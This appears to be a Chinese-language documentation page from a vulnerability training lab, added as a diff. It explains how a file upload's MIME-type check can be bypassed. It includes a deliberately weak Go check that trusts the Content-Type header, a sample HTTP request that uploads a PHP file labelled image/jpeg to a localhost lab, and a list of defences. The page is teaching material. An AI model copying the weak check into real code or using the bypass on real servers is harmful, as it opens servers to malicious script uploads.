@@ -1,0 +1,79 @@
+---
+sidebar_position: 3
+---
+
+# 图片上传：MIME 类型可绕过
+
+文件上传时的 MIME 类型绕过漏洞是一种常见的安全问题。在 Web 应用程序中，文件上传功能允许用户将文件(例如图片)上传到服务器。通常，应用程序会检查上传文件的 MIME 类型，以确保用户上传的是允许的文件类型(例如图片文件)。然而，攻击者可以通过伪造文件的 MIME 类型来绕过这个检查，上传一些非图片文件，从而导致安全漏洞。
+
+服务端 MIME 类型检测是通过检查 http 包的 Content-Type 字段中的值来判断上传文件是否合法的。
+
+1. text/plain（纯文本）
+2. text/html（HTML 文档）
+3. text/javascript（js 代码）
+4. application/xhtml+xml（XHTML 文档）
+5. image/gif（GIF 图像）
+6. image/jpeg（JPEG 图像）
+7. image/png（PNG 图像）
+8. video/mpeg（MPEG 动画）
+9. application/octet-stream（二进制数据）
+10. application/pdf（PDF 文档）
+
+### 示例代码：
+
+以下代码片段用于验证上传文件的 MIME 类型是否为图片类型。如果"Content-Type"字段不存在或格式不正确，或者上传的文件不是图片类型，那么会返回上传失败的信息，否则认为上传是成功的，这是一个简单的 MIME 类型检查过程
+
+```Go
+t, _, err := mime.ParseMediaType(header.Header.Get("Content-Type"))
+if err != nil {
+  Failed(writer, request, "mimt.ParseMediaType Failed: %s", err)
+   return}
+if !utils.IContains(t, "image/") {
+  unsafeTemplateRender(writer, request, uploadFailed, map[string]any{
+  "reason": fmt.Sprintf("found mime type: %s, not a image/*", t,
+  ),})
+  return}
+```
+
+### 攻击示例：
+
+攻击者可以通过修改 HTTP 请求的头部信息，将上传文件的 MIME 类型伪装成图片文件的 MIME 类型，从而欺骗服务器，使其误认为上传的是合法的图片文件。
+
+```HTML
+POST /upload/case/mime HTTP/1.1
+Host: 127.0.0.1:8787
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Encoding: identity
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Content-Type: multipart/form-data; boundary=---------------------------4523705081261853528174745732
+DNT: 1
+Origin: http://127.0.0.1:8787
+Referer: http://127.0.0.1:8787/upload/main?case=mime
+User-Agent: Mozilla/5.0 Gecko/20100101 Firefox/91.0
+Content-Length: 182157
+
+-----------------------------4523705081261853528174745732
+Content-Disposition: form-data; name="filename"; filename="help.php"
+Content-Type: image/jpeg
+
+"<?php\x0aerror_reporting\x29E_ERROR\x28;\x0aheader\x29\"content-Type: text/html; charset=gb2312\"\x28;
+```
+
+### 防御措施：
+
+为防止文件上传时的 MIME 类型绕过漏洞，开发者应该采取以下措施：
+
+- 验证文件的真实类型：不仅仅依赖于客户端提供的 MIME 类型，还需要在服务器端验证文件的实际内容。可以使用文件的魔术数字（magic number）或者第三方库来检查文件的真实类型。
+- 限制上传文件类型：明确规定允许上传的文件类型，并在服务器端进行白名单过滤。拒绝接受不在白名单中的文件类型。
+- 重命名上传文件：在保存上传文件时，将文件重命名为一个随机的、唯一的文件名，不要使用用户提供的文件名。
+
+### 靶场演示： 视频
+
+<video
+  src="/img/yaklab/fileupload/02unsafe-mime.mp4"
+  loop={true}
+  playsInline={true}
+  controls={true}
+  autoPlay={true}
+  style={{ width: 890 }}
+/>
